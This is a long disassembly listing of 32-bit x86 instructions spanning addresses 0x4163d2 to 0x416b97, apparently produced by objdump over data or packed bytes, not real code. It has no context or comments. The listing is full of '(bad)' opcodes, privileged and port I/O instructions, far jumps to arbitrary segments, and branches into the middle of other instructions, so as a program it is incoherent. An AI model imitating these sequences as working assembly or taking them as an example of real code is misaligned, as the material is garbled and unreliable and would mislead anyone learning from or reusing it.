  4163d2:	sbb    al,0xe0
  4163d4:	(bad)  
  4163d5:	mov    edx,0xb61e443c
  4163da:	fimul  DWORD PTR [ebp+eiz*8+0x52]
  4163de:	push   ebp
  4163df:	shl    DWORD PTR [ebx+0x54ae06f],1
  4163e5:	dec    ebp
  4163e6:	ja     0x416413
  4163e8:	xor    BYTE PTR [edi+0x6782e5f5],bh
  4163ee:	xchg   edi,eax
  4163ef:	ret    0x1d5c
  4163f2:	dec    eax
  4163f3:	add    al,0x89
  4163f5:	sbb    eax,0xf057a4c
  4163fa:	outs   dx,BYTE PTR ds:[esi]
  4163fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163fc:	xor    cl,BYTE PTR [eax+0x2c9adafb]
  416402:	inc    edx
  416403:	pop    esi
  416404:	dec    edx
  416405:	xchg   edx,eax
  416406:	mov    ebx,0x7fed7e01
  41640b:	inc    esi
  41640c:	adc    al,0xc
  41640e:	shr    BYTE PTR [edi-0x53],1
  416411:	mov    cs,ecx
  416413:	mov    ?,WORD PTR [ecx-0xa21d303]
  416419:	jb     0x4163a6
  41641b:	mov    edi,0x21c55c03
  416420:	and    DWORD PTR [ecx],esi
  416422:	call   0x6087:0x3a9a42fa
  416429:	int3   
  41642a:	sub    eax,0x8233fdf0
  41642f:	sbb    edx,DWORD PTR [eax]
  416431:	mov    ecx,0xe62f153
  416436:	bound  ebp,QWORD PTR [esi]
  416438:	pop    ds
  416439:	imul   BYTE PTR [edi-0x7cf113a0]
  41643f:	mov    al,0x86
  416441:	data16 icebp 
  416443:	aam    0x23
  416445:	dec    edi
  416446:	push   ecx
  416447:	jle    0x4163f2
  416449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41644a:	pop    ebx
  41644b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41644c:	mov    cs,WORD PTR [edx]
  41644e:	je     0x4164c0
  416450:	mov    DWORD PTR [eax-0x2b149ab0],ebx
  416456:	std    
  416457:	out    dx,al
  416458:	jne    0x4163f5
  41645a:	xchg   ecx,eax
  41645b:	push   eax
  41645c:	xor    BYTE PTR [ebp-0x5a],0xd1
  416460:	in     al,dx
  416461:	jnp    0x416472
  416463:	popa   
  416464:	jg     0x4164c8
  416466:	mov    esi,0xecb3a358
  41646b:	pushf  
  41646c:	fldenv [ebx]
  41646e:	std    
  41646f:	sub    edi,DWORD PTR [ecx-0x19]
  416472:	and    ah,BYTE PTR [edx+0x6251bae2]
  416478:	rol    BYTE PTR [ebx],0x66
  41647b:	mov    ch,0xdf
  41647d:	sti    
  41647e:	xchg   edx,eax
  41647f:	in     al,0xe0
  416481:	xchg   DWORD PTR [ecx+0x7],edi
  416484:	jnp    0x4164a9
  416486:	sti    
  416487:	jecxz  0x416490
  416489:	aad    0xc2
  41648b:	or     eax,0x51af457
  416490:	fnstcw WORD PTR [esi+0x15efd939]
  416496:	mov    esi,0xe04c97d4
  41649b:	shl    BYTE PTR [ebp-0x140f223e],0xf0
  4164a2:	sbb    BYTE PTR [ecx+0x38],dl
  4164a5:	and    eax,0xd03b7b54
  4164aa:	sti    
  4164ab:	mov    esi,0xb2e8a5a9
  4164b0:	push   edx
  4164b1:	mov    ebp,0x45469e6f
  4164b6:	loop   0x416475
  4164b8:	fwait
  4164b9:	imul   edi,eax,0x3b
  4164bc:	cli    
  4164bd:	test   al,0x5d
  4164bf:	add    eax,0x637db1de
  4164c4:	adc    eax,edi
  4164c6:	rcl    BYTE PTR fs:[edi-0x76],0x4c
  4164cb:	iret   
  4164cc:	jg     0x4164c8
  4164ce:	add    al,0xcb
  4164d0:	adc    DWORD PTR [edi],edi
  4164d2:	hlt    
  4164d3:	and    eax,edi
  4164d5:	imul   eax,DWORD PTR ds:0x3319ea26,0xffffffc4
  4164dc:	or     BYTE PTR [edx+0x19],0x14
  4164e0:	pop    esp
  4164e1:	adc    al,0x38
  4164e3:	lock scas eax,DWORD PTR es:[edi]
  4164e5:	xchg   BYTE PTR [esi],cl
  4164e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164e8:	inc    eax
  4164e9:	mov    eax,ds:0xba7326e5
  4164ee:	adc    bl,dl
  4164f0:	out    dx,eax
  4164f1:	jmp    0xd582:0x9663f92c
  4164f8:	int    0x6d
  4164fa:	outs   dx,BYTE PTR ds:[esi]
  4164fb:	clc    
  4164fc:	or     eax,0x69720c3d
  416501:	sahf   
  416502:	mov    al,ds:0x94a8e5e0
  416507:	cwde   
  416508:	lods   al,BYTE PTR ds:[esi]
  416509:	arpl   WORD PTR [ebx+0x51],bp
  41650c:	and    cl,BYTE PTR [esi+edx*8]
  41650f:	mov    edx,DWORD PTR [ecx+0x6c525a1]
  416515:	or     BYTE PTR [esi+0x13e3c3e7],bh
  41651b:	out    0xa0,eax
  41651d:	jae    0x4164f1
  41651f:	jne    0x416512
  416521:	stc    
  416522:	inc    ebp
  416523:	jge    0x4164ae
  416525:	mov    bh,0x3e
  416527:	stos   BYTE PTR es:[edi],al
  416528:	jg     0x4164cf
  41652a:	scas   eax,DWORD PTR es:[edi]
  41652b:	repz jmp 0xb178a580
  416531:	nop
  416532:	das    
  416533:	inc    ebx
  416534:	in     al,0x76
  416536:	adc    al,0x52
  416538:	dec    edi
  416539:	test   al,0x77
  41653b:	pusha  
  41653c:	ins    BYTE PTR es:[edi],dx
  41653d:	les    ebp,FWORD PTR [edx+edx*8]
  416540:	les    ebp,FWORD PTR [edi+0x38]
  416543:	jnp    0x4164e1
  416545:	(bad)  
  416546:	ror    BYTE PTR [ebp+esi*4-0x6a],cl
  41654a:	daa    
  41654b:	neg    dh
  41654d:	aas    
  41654e:	mov    al,ds:0xf024817b
  416553:	lahf   
  416554:	test   al,0xe3
  416556:	test   DWORD PTR [esi],edi
  416558:	pushf  
  416559:	scas   al,BYTE PTR es:[edi]
  41655a:	push   ds
  41655b:	lods   eax,DWORD PTR ds:[esi]
  41655c:	lahf   
  41655d:	inc    edi
  41655e:	test   al,cl
  416560:	inc    ecx
  416561:	xor    eax,0x79cf260d
  416566:	adc    al,0x25
  416568:	mov    eax,ds:0x41fcee87
  41656d:	mov    eax,DWORD PTR [ebx-0x51]
  416570:	repz je 0x41658c
  416573:	or     esp,DWORD PTR [eax-0x21]
  416576:	or     al,0xc2
  416578:	pop    ss
  416579:	das    
  41657a:	retf   0xcadb
  41657d:	cmp    al,BYTE PTR [edx]
  41657f:	loop   0x416561
  416581:	(bad)  
  416582:	iret   
  416583:	cs mov bh,0x15
  416586:	icebp  
  416587:	clc    
  416588:	pusha  
  416589:	pop    ss
  41658a:	jo     0x416600
  41658c:	sub    eax,0x31da4a0
  416591:	push   0xf58079b6
  416596:	mov    cl,0x1b
  416598:	test   al,0x61
  41659a:	enter  0xf227,0xec
  41659e:	aas    
  41659f:	pop    eax
  4165a0:	and    BYTE PTR [edx],bh
  4165a2:	adc    cl,ah
  4165a4:	mov    cs,WORD PTR [esi+0x55]
  4165a7:	cmp    DWORD PTR [eax+ebp*1],ecx
  4165aa:	lahf   
  4165ab:	pop    ss
  4165ac:	outs   dx,BYTE PTR ds:[esi]
  4165ad:	pop    esi
  4165ae:	push   edi
  4165af:	mov    ds:0x44f1e295,eax
  4165b4:	mov    eax,esi
  4165b6:	leave  
  4165b7:	js     0x4165b1
  4165b9:	pop    eax
  4165ba:	jo     0x416540
  4165bc:	ss mov ebp,0xdff726b7
  4165c2:	sbb    eax,0x9f4d1c66
  4165c7:	xchg   BYTE PTR [esi+0x5c],bl
  4165ca:	add    ebp,DWORD PTR [eax]
  4165cc:	pop    ss
  4165cd:	mov    eax,0x35ee7ded
  4165d2:	repnz mov dh,0xea
  4165d5:	mov    al,0xff
  4165d7:	fld    QWORD PTR [eax-0x3d]
  4165da:	ds push ecx
  4165dc:	jb     0x416649
  4165de:	cmp    al,0xcc
  4165e0:	in     eax,dx
  4165e1:	es stos DWORD PTR es:[edi],eax
  4165e3:	test   bl,0xc5
  4165e6:	or     esi,DWORD PTR [ebx+0x5b]
  4165e9:	icebp  
  4165ea:	sbb    al,0x24
  4165ec:	push   0x12d379cb
  4165f1:	xchg   ecx,eax
  4165f2:	mov    ebx,0x92ab783c
  4165f7:	add    esp,eax
  4165f9:	cdq    
  4165fa:	jecxz  0x416649
  4165fc:	in     al,0x29
  4165fe:	jbe    0x416673
  416600:	push   0x7d
  416602:	(bad)  
  416603:	cs xchg edx,eax
  416605:	mov    al,ds:0xa4dd66a7
  41660a:	call   0x13b39751
  41660f:	xor    ch,0x1b
  416612:	shr    DWORD PTR [ecx],1
  416614:	call   0xce2e:0x7e11b035
  41661b:	in     eax,0xa7
  41661d:	and    eax,0x54b1b4e9
  416622:	(bad)  
  416623:	cli    
  416624:	test   DWORD PTR [ebx-0x14784c17],ebp
  41662a:	in     al,dx
  41662b:	inc    DWORD PTR [ebx-0x7b]
  41662e:	std    
  41662f:	dec    edi
  416630:	push   esi
  416631:	adc    eax,0x633e5c20
  416636:	jecxz  0x416698
  416638:	arpl   WORD PTR [ecx+eiz*4+0x71],sp
  41663c:	xor    DWORD PTR [eax+0x37],ecx
  41663f:	loop   0x416648
  416641:	jno    0x41667c
  416643:	mov    dl,0x71
  416645:	sub    edx,DWORD PTR [ebp-0x4262255]
  41664b:	mov    esi,0xeb4a2d7c
  416650:	mov    ecx,0xba577a82
  416655:	int3   
  416656:	pop    ecx
  416657:	mov    ss,esp
  416659:	lock pop ss
  41665b:	bound  esi,QWORD PTR [edi+0x54]
  41665e:	shl    ch,0x16
  416661:	clc    
  416662:	sub    ecx,DWORD PTR [ebx+0x6586f41]
  416668:	scas   al,BYTE PTR es:[edi]
  416669:	dec    esp
  41666a:	pop    ss
  41666b:	int    0xcc
  41666d:	retf   0xc7f2
  416670:	push   0xffffffc6
  416672:	es mov edx,0x42107837
  416678:	icebp  
  416679:	shr    DWORD PTR [ecx+0x27b3c44e],0xc9
  416680:	mov    al,0xb
  416683:	xrelease mov DWORD PTR gs:[edx+0x1a],ebx
  416688:	pop    es
  416689:	fst    QWORD PTR [ebx]
  41668b:	inc    esp
  41668c:	push   edi
  41668d:	xchg   esi,eax
  41668e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41668f:	mov    edx,0x95340354
  416694:	push   cs
  416695:	lods   al,BYTE PTR ds:[esi]
  416696:	jcxz   0x416691
  416699:	sar    ch,cl
  41669b:	pop    ebx
  41669c:	in     eax,dx
  41669d:	mov    ebx,0xfe416056
  4166a2:	jge    0x416679
  4166a4:	push   edi
  4166a5:	sbb    eax,0x9690533a
  4166aa:	push   ecx
  4166ab:	rol    DWORD PTR [ecx-0x36],0x62
  4166af:	lock retf 
  4166b1:	mov    edx,0x57f4643d
  4166b6:	cli    
  4166b7:	cdq    
  4166b8:	cmp    bh,BYTE PTR [ecx-0x29df67c4]
  4166be:	lds    ebx,FWORD PTR [edi+0x69fd8865]
  4166c4:	aam    0xef
  4166c6:	mov    dl,0x3a
  4166c8:	xor    al,0xfe
  4166ca:	xor    esi,ebp
  4166cc:	jecxz  0x41667f
  4166ce:	mov    dh,BYTE PTR [ebx-0x49fbb6fe]
  4166d4:	mov    ebx,0x14046ebe
  4166d9:	out    dx,al
  4166da:	xor    BYTE PTR [edx],bl
  4166dc:	jne    0x416668
  4166de:	or     ecx,DWORD PTR [ebx]
  4166e0:	imul   edi,ecx,0xb
  4166e3:	add    al,0x1c
  4166e5:	dec    ecx
  4166e6:	and    al,0xba
  4166e8:	jmp    0xd5f44d5d
  4166ed:	aas    
  4166ee:	pusha  
  4166ef:	mov    bl,0xdd
  4166f1:	mov    dl,0x60
  4166f3:	retf   
  4166f4:	jmp    0xb1a2:0xf63b6a8
  4166fb:	cmp    al,0x6d
  4166fd:	int    0x75
  4166ff:	push   edi
  416700:	jecxz  0x4166ca
  416702:	sbb    ecx,DWORD PTR [ecx+0x5f]
  416705:	add    eax,0xfd3fcadf
  41670a:	push   es
  41670b:	mov    bh,0xda
  41670d:	pop    ebx
  41670e:	inc    edx
  41670f:	std    
  416710:	stos   BYTE PTR es:[edi],al
  416711:	and    DWORD PTR [eax],0x7c594cf2
  416717:	out    dx,eax
  416718:	mov    al,0x6c
  41671a:	push   esi
  41671b:	jle    0x416753
  41671d:	stc    
  41671e:	cmp    eax,ebx
  416720:	loop   0x416705
  416722:	jb     0x41670c
  416724:	daa    
  416725:	add    edx,DWORD PTR [esi]
  416727:	bound  esp,QWORD PTR [ecx-0x737ece9b]
  41672d:	rep lods eax,DWORD PTR ds:[esi]
  41672f:	sub    DWORD PTR [ebp+0x42],ecx
  416732:	std    
  416733:	out    dx,eax
  416734:	nop
  416735:	or     edx,edx
  416737:	hlt    
  416738:	add    edi,ebx
  41673a:	ds add eax,0xeb5c2042
  416740:	fisub  WORD PTR [ebx]
  416742:	das    
  416743:	adc    eax,0xe999322c
  416748:	cmc    
  416749:	repnz cmc 
  41674b:	std    
  41674c:	ss or  eax,0x3361e1f
  416752:	in     al,dx
  416753:	icebp  
  416754:	rcr    BYTE PTR [esi+ebx*1+0x0],0x4b
  416759:	stos   DWORD PTR es:[edi],eax
  41675a:	adc    BYTE PTR [ecx],dl
  41675c:	(bad)  
  41675d:	mov    dh,0x2d
  41675f:	mov    al,0xe1
  416761:	pop    ss
  416762:	and    eax,0x66d891
  416767:	(bad)  
  416768:	jmp    0xbf8d:0xdf9b7302
  41676f:	mov    al,0x50
  416771:	adc    BYTE PTR [ebx],bl
  416773:	daa    
  416774:	pop    ebp
  416775:	test   al,0x36
  416777:	neg    DWORD PTR [ecx-0x30]
  41677a:	mov    cl,0x8d
  41677c:	dec    ebx
  41677d:	iret   
  41677e:	adc    BYTE PTR [ebx],0xde
  416781:	sub    ah,cl
  416783:	pop    esi
  416784:	or     eax,0xb2f450cb
  416789:	adc    cl,BYTE PTR [ebp+0x6f]
  41678c:	(bad)  
  41678d:	cli    
  41678e:	sar    ah,cl
  416790:	mov    edx,ecx
  416792:	aam    0x90
  416794:	dec    esi
  416795:	sub    dl,dl
  416797:	fisubr WORD PTR [esi+ebp*1]
  41679a:	bound  eax,QWORD PTR [eax+0x26]
  41679d:	cli    
  41679e:	jl     0x416752
  4167a0:	and    ecx,DWORD PTR [ecx+0x7d]
  4167a3:	outs   dx,BYTE PTR ds:[esi]
  4167a4:	sbb    DWORD PTR [ecx+0x34],esp
  4167a7:	gs mov eax,0xe0c98676
  4167ad:	mov    ah,0x54
  4167af:	into   
  4167b0:	lea    ebp,[edi-0x4c19b3de]
  4167b6:	ret    
  4167b7:	mov    esi,0xa4d3fbd
  4167bc:	cmp    DWORD PTR [eax+esi*4],ebp
  4167bf:	pusha  
  4167c0:	(bad)  
  4167c2:	jnp    0x4167aa
  4167c4:	test   BYTE PTR gs:[ecx],cl
  4167c7:	out    0xfd,eax
  4167c9:	popf   
  4167ca:	sub    ecx,DWORD PTR [ecx-0x73f663fd]
  4167d0:	fwait
  4167d1:	inc    edi
  4167d2:	lds    edi,FWORD PTR [ebp+0x59]
  4167d5:	xor    al,0x74
  4167d7:	rol    BYTE PTR [edi],cl
  4167d9:	xchg   esi,eax
  4167da:	idiv   DWORD PTR [edx-0x42]
  4167dd:	xchg   edx,eax
  4167de:	cmp    edx,DWORD PTR [edx]
  4167e0:	sub    dl,bl
  4167e2:	ficomp WORD PTR [ecx-0x326cda2f]
  4167e8:	or     DWORD PTR [esi-0x43],ebx
  4167eb:	iret   
  4167ec:	ins    BYTE PTR es:[edi],dx
  4167ed:	and    BYTE PTR [eax+0x65fa2439],cl
  4167f3:	xor    BYTE PTR [edi-0x7b1f37e],cl
  4167f9:	or     eax,0xb5fb8f0c
  4167fe:	sbb    eax,0x4050b653
  416803:	push   ebx
  416804:	sbb    al,0x1e
  416806:	fsubr  DWORD PTR [ecx]
  416808:	xchg   ecx,eax
  416809:	sub    dl,BYTE PTR [eax]
  41680b:	jg     0x4167f8
  41680d:	cmp    cl,BYTE PTR fs:[ebx]
  416810:	into   
  416811:	jo     0x416810
  416813:	cmp    DWORD PTR [esi],ecx
  416815:	mov    edx,0x84393c43
  41681a:	ss in  al,dx
  41681c:	loop   0x4167ec
  41681e:	popf   
  41681f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416820:	mov    cl,0x2f
  416822:	in     eax,0xcd
  416824:	push   edi
  416825:	pop    edx
  416826:	loop   0x4168a0
  416828:	ds (bad) 
  41682a:	mov    al,0x31
  41682c:	leave  
  41682d:	mov    edx,0x74843fc
  416832:	fstp   QWORD PTR [ebx-0x42619ccf]
  416838:	inc    ecx
  416839:	mov    ecx,0x7c90f56f
  41683e:	shrd   DWORD PTR [esi-0x444afc70],edx,0x71
  416846:	je     0x4168a5
  416848:	sbb    DWORD PTR ds:0xd04203f8,esp
  41684e:	iret   
  41684f:	sar    BYTE PTR [bx+si],cl
  416852:	ficomp WORD PTR [ebx-0x25]
  416855:	mov    DWORD PTR [eax-0x44b1caf],esi
  41685b:	sar    DWORD PTR [ebx-0x7616cca1],0xa8
  416862:	das    
  416863:	add    ebp,edx
  416865:	pop    ebx
  416866:	mov    edi,0x76884b18
  41686b:	cdq    
  41686c:	aas    
  41686d:	sbb    DWORD PTR [ebx+0x4079e39b],esp
  416873:	in     al,0xb9
  416875:	loop   0x4168be
  416877:	mov    dh,0x68
  416879:	dec    ebp
  41687a:	cwde   
  41687b:	pop    edx
  41687c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41687d:	xchg   esi,eax
  41687e:	adc    DWORD PTR [edx-0x5c],0x58
  416882:	clc    
  416883:	nop
  416884:	xchg   ebp,eax
  416885:	mov    edx,0xb5e4c458
  41688a:	into   
  41688b:	fcom   QWORD PTR [ecx+0x9bfef74]
  416891:	and    dh,dl
  416893:	stc    
  416894:	pop    eax
  416895:	popa   
  416896:	sti    
  416897:	mov    dh,0x5e
  416899:	jnp    0x4168f3
  41689b:	stc    
  41689c:	pop    esi
  41689d:	js     0x416885
  41689f:	inc    ecx
  4168a0:	nop
  4168a1:	dec    ecx
  4168a2:	fst    DWORD PTR [edx-0x33667169]
  4168a8:	dec    edi
  4168a9:	scas   al,BYTE PTR es:[edi]
  4168aa:	enter  0x4cbc,0x5e
  4168ae:	add    DWORD PTR [ebx+0x3d5a5dc],0x39d25b00
  4168b8:	mov    BYTE PTR [eax],dl
  4168ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168bb:	push   ecx
  4168bc:	sbb    al,0x90
  4168be:	loope  0x416938
  4168c0:	push   DWORD PTR [esi+0x1]
  4168c3:	mov    DWORD PTR [edx],eax
  4168c5:	leave  
  4168c6:	fsub   DWORD PTR [ebp+0x4a739d4b]
  4168cc:	xor    al,0x94
  4168ce:	sbb    eax,0x5f43530b
  4168d3:	cli    
  4168d4:	ins    DWORD PTR es:[edi],dx
  4168d5:	jmp    0xe4b9:0x71a4e97
  4168dc:	jg     0x4168a6
  4168de:	mov    esp,0x24e88856
  4168e3:	std    
  4168e4:	mov    bh,0xfd
  4168e6:	ret    0x3978
  4168e9:	sti    
  4168ea:	ja     0x4168f1
  4168ec:	or     eax,0x835ba485
  4168f1:	rcl    BYTE PTR [esi+0x19],cl
  4168f4:	jae    0x416953
  4168f6:	ja     0x4168a5
  4168f8:	xchg   edi,eax
  4168f9:	sbb    DWORD PTR [ebx-0x48],esp
  4168fc:	outs   dx,DWORD PTR ds:[esi]
  4168fd:	add    ah,bh
  4168ff:	jno    0x41695c
  416901:	pop    es
  416902:	fnstsw ax
  416904:	ins    DWORD PTR es:[edi],dx
  416905:	or     dh,BYTE PTR [edx-0x395274df]
  41690b:	adc    eax,0x4c8c0695
  416910:	xor    BYTE PTR [eax],dh
  416912:	and    DWORD PTR [esi-0x1fcc9351],esi
  416918:	push   es
  416919:	jg     0x41694a
  41691b:	test   BYTE PTR [eax+0x3],ch
  41691e:	sbb    ebx,edx
  416920:	dec    ecx
  416921:	push   0x1e
  416923:	sub    ebx,edx
  416925:	lea    ebx,[ecx-0x8]
  416928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416929:	inc    ebp
  41692a:	ins    DWORD PTR es:[edi],dx
  41692b:	aad    0x29
  41692d:	push   esp
  41692e:	mov    al,bl
  416930:	sbb    bh,al
  416932:	push   ecx
  416933:	or     edi,DWORD PTR [edi-0x49c62a4]
  416939:	cmc    
  41693a:	adc    eax,edx
  41693c:	int    0xd1
  41693e:	jno    0x4168ca
  416940:	jnp    0x416907
  416942:	add    al,0xdf
  416944:	jnp    0x416906
  416946:	xchg   ebx,eax
  416947:	cld    
  416948:	leave  
  416949:	mov    ebx,0x2e57e8b6
  41694e:	sbb    eax,0x1210550f
  416953:	outs   dx,DWORD PTR ds:[esi]
  416954:	xlat   BYTE PTR ds:[ebx]
  416955:	in     eax,dx
  416956:	clc    
  416957:	xor    eax,0x7a55936f
  41695c:	pop    ds
  41695d:	adc    ecx,edx
  41695f:	mov    ds:0x139000a9,al
  416964:	sbb    ch,BYTE PTR [edi]
  416966:	test   ecx,ebp
  416968:	out    0xe5,al
  41696a:	adc    eax,0x6cca392b
  41696f:	(bad)  
  416970:	or     ah,BYTE PTR [ecx-0x18]
  416973:	arpl   WORD PTR [ecx-0x3a],cx
  416976:	cmp    esi,DWORD PTR [edx]
  416978:	xchg   DWORD PTR [esi-0x1b103f23],edi
  41697e:	xor    eax,0xdee9fb60
  416983:	jb     0x41693a
  416985:	mov    dh,0x4
  416987:	sub    al,0x61
  416989:	dec    ebx
  41698a:	sbb    edi,esi
  41698c:	fs add al,0xa8
  41698f:	lock adc edi,edi
  416992:	lods   al,BYTE PTR ds:[esi]
  416993:	jle    0x416925
  416995:	fdiv   st,st(5)
  416997:	arpl   WORD PTR [edx],bp
  416999:	outs   dx,BYTE PTR ds:[esi]
  41699a:	push   edx
  41699b:	bound  edx,QWORD PTR [ebp+0x6a]
  41699e:	mov    WORD PTR [eax],ss
  4169a0:	into   
  4169a1:	mov    ds:0x8dd3c75a,eax
  4169a6:	lock es sub al,0x36
  4169aa:	cdq    
  4169ab:	je     0x416932
  4169ad:	mov    dl,0xba
  4169af:	sub    eax,0x2e186841
  4169b4:	imul   eax,DWORD PTR [edx+0x5d],0xd6e7b682
  4169bb:	add    ebp,DWORD PTR [esi]
  4169bd:	iret   
  4169be:	sub    bh,BYTE PTR [ecx+eax*1+0xe]
  4169c2:	fsubr  QWORD PTR [eax-0x23872570]
  4169c8:	push   esi
  4169c9:	popa   
  4169ca:	jae    0x4169cc
  4169cc:	jns    0x4169a4
  4169ce:	sub    DWORD PTR [eax+0x1a],0x9df2f996
  4169d5:	mov    bh,0xa8
  4169d7:	(bad)  
  4169d9:	in     eax,0x91
  4169db:	fld    st(4)
  4169dd:	xchg   edi,eax
  4169de:	xor    ebx,edi
  4169e0:	cmp    al,0x12
  4169e2:	rol    BYTE PTR [eax-0x2d27076d],1
  4169e8:	sub    DWORD PTR [ebx-0x4092581d],eax
  4169ee:	sub    eax,0xca3a5c2c
  4169f3:	scas   al,BYTE PTR es:[edi]
  4169f4:	out    0xf9,al
  4169f6:	test   al,0x4c
  4169f9:	mov    bl,0x61
  4169fb:	sub    al,0xb5
  4169fd:	mov    dl,bl
  4169ff:	cli    
  416a00:	mov    ds:0xa3f2e32c,eax
  416a05:	ss jb  0x4169cf
  416a08:	add    DWORD PTR [esi+0x1f9c2b83],ecx
  416a0e:	and    esi,edx
  416a10:	pop    edx
  416a11:	inc    ebx
  416a12:	popa   
  416a13:	jnp    0x416a4d
  416a15:	(bad)  
  416a16:	push   ebx
  416a17:	stos   DWORD PTR es:[di],eax
  416a19:	mov    bl,0xaa
  416a1b:	in     eax,0xd2
  416a1d:	popa   
  416a1e:	dec    edi
  416a1f:	adc    BYTE PTR [edx+0xd190033],0xac
  416a26:	pushf  
  416a27:	popf   
  416a28:	jo     0x416a0b
  416a2a:	jle    0x416a1b
  416a2c:	ja     0x416a0f
  416a2e:	repnz inc esi
  416a30:	push   esi
  416a31:	push   cx
  416a33:	lds    esi,FWORD PTR [ebx+0x286c8d24]
  416a39:	aad    0xaf
  416a3b:	ss iret 
  416a3d:	les    esi,FWORD PTR [edi+ebp*4]
  416a40:	pop    edx
  416a41:	add    al,0xe1
  416a43:	daa    
  416a44:	mov    al,0x87
  416a46:	pop    ds
  416a47:	pop    es
  416a48:	nop
  416a49:	dec    esp
  416a4a:	imul   esp,DWORD PTR [edx],0x66
  416a4d:	test   al,0x2
  416a4f:	pop    esi
  416a50:	pop    edi
  416a51:	loope  0x416a13
  416a53:	ds mov eax,0xfc1d4aa7
  416a59:	push   edx
  416a5a:	push   ecx
  416a5b:	or     eax,0x2aed818e
  416a60:	test   eax,0x3af5d40b
  416a65:	fwait
  416a66:	ss mov ss,esp
  416a69:	aas    
  416a6a:	cld    
  416a6b:	fisubr DWORD PTR [edi+0x5f057f11]
  416a71:	out    0xf8,eax
  416a73:	retf   
  416a74:	(bad)  
  416a75:	das    
  416a76:	xchg   esi,eax
  416a77:	or     ch,BYTE PTR [ecx-0x6611fea3]
  416a7d:	or     al,0xca
  416a7f:	xchg   esi,eax
  416a80:	inc    eax
  416a81:	out    dx,al
  416a82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a83:	add    DWORD PTR [esi],esp
  416a85:	cmp    DWORD PTR [ecx+0x43],eax
  416a88:	into   
  416a89:	inc    esi
  416a8a:	loop   0x416ae6
  416a8c:	pusha  
  416a8d:	pop    ds
  416a8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a8f:	cmc    
  416a90:	retf   0x2097
  416a93:	leave  
  416a94:	mov    bl,0x3e
  416a96:	sub    al,BYTE PTR [esi-0x6bcf369]
  416a9c:	dec    esp
  416a9d:	pop    edi
  416a9e:	lds    ecx,FWORD PTR [esi]
  416aa0:	pop    ss
  416aa1:	cs dec ebp
  416aa3:	sbb    al,0x41
  416aa5:	shl    BYTE PTR ds:0x2812a6bf,0x96
  416aac:	cmp    BYTE PTR [eax-0x36],ah
  416aaf:	push   0x5d
  416ab1:	pop    ebp
  416ab2:	pop    ebp
  416ab3:	adc    eax,0xcb971485
  416ab8:	or     DWORD PTR [ebp-0xb54c828],esp
  416abe:	lahf   
  416abf:	xchg   esi,eax
  416ac0:	xor    ah,BYTE PTR [edi+0x14]
  416ac3:	into   
  416ac4:	scas   eax,DWORD PTR es:[edi]
  416ac5:	inc    edx
  416ac6:	and    ebx,ecx
  416ac8:	out    0x49,eax
  416aca:	add    ah,ch
  416acc:	sub    al,0xb0
  416ace:	mov    al,ds:0x7d7af2d
  416ad3:	mov    dl,0x9b
  416ad5:	jns    0x416a94
  416ad7:	sub    esp,DWORD PTR [edi+0x93a8e21]
  416add:	or     al,0xbe
  416adf:	cmc    
  416ae0:	mov    fs,WORD PTR [ecx+eax*1]
  416ae3:	dec    ebp
  416ae4:	fild   QWORD PTR [ebx]
  416ae6:	addr16 add ch,dl
  416ae9:	jns    0x416acc
  416aeb:	sbb    eax,ebx
  416aed:	popf   
  416aee:	cmp    eax,0x1f5823fc
  416af3:	aaa    
  416af4:	mov    ch,0x50
  416af6:	xor    al,0x55
  416af8:	mov    BYTE PTR [ecx],dl
  416afa:	adc    BYTE PTR [eax-0x39],al
  416afd:	jmp    0x56985b42
  416b02:	xor    al,0x31
  416b04:	shl    bl,cl
  416b06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b07:	fimul  WORD PTR [ebx]
  416b09:	repnz scas al,BYTE PTR es:[edi]
  416b0b:	jb     0x416b6d
  416b0d:	aad    0x2e
  416b0f:	(bad)  
  416b10:	fnstsw WORD PTR [esi]
  416b12:	(bad)  
  416b13:	pop    ecx
  416b14:	hlt    
  416b15:	and    DWORD PTR [ecx-0x10],0x23d3d43a
  416b1c:	cmp    edx,DWORD PTR [ebx+0x3c21db1e]
  416b22:	mov    ebp,0xd04b0f31
  416b27:	push   esp
  416b28:	punpcklbw mm4,mm7
  416b2b:	popf   
  416b2c:	mov    cl,BYTE PTR [esi]
  416b2e:	clc    
  416b2f:	in     al,0xf8
  416b31:	add    al,cl
  416b33:	xchg   DWORD PTR [ecx-0x7735ec16],esp
  416b39:	pusha  
  416b3a:	outs   dx,BYTE PTR ds:[esi]
  416b3b:	dec    edx
  416b3c:	not    dl
  416b3e:	daa    
  416b3f:	ins    BYTE PTR es:[edi],dx
  416b40:	mov    ds:0x2edd061,al
  416b45:	dec    esp
  416b46:	push   edi
  416b47:	jnp    0x416b31
  416b49:	inc    eax
  416b4a:	das    
  416b4b:	dec    BYTE PTR [ebp-0x2b]
  416b4e:	lds    ebp,FWORD PTR [ebx+0x2e]
  416b51:	xlat   BYTE PTR ds:[ebx]
  416b52:	mul    BYTE PTR [ecx-0x3f]
  416b55:	shl    ebp,0x91
  416b58:	adc    al,0x6c
  416b5a:	push   ebx
  416b5b:	loope  0x416b50
  416b5d:	hlt    
  416b5e:	mov    ebp,esi
  416b60:	test   eax,0xf0fb7675
  416b65:	push   ds
  416b66:	nop
  416b67:	add    eax,0x5d5e8285
  416b6c:	jns    0x416b3d
  416b6e:	push   ebx
  416b6f:	jne    0x416b47
  416b71:	pop    ebp
  416b72:	push   ebx
  416b73:	daa    
  416b74:	mov    eax,ds:0x56198284
  416b79:	fist   DWORD PTR [edx+0x3e]
  416b7c:	cs jle 0x416b46
  416b7f:	arpl   WORD PTR [ecx+0x4eb1813f],sp
  416b85:	mov    WORD PTR [ecx-0x60],cs
  416b88:	adc    BYTE PTR [esi+0x2117c8d0],bl
  416b8e:	or     al,0xe0
  416b90:	sub    al,0x46
  416b92:	repz gs push ebx
  416b95:	jb     0x416c0a
  416b97:	repnz xchg ax,ax
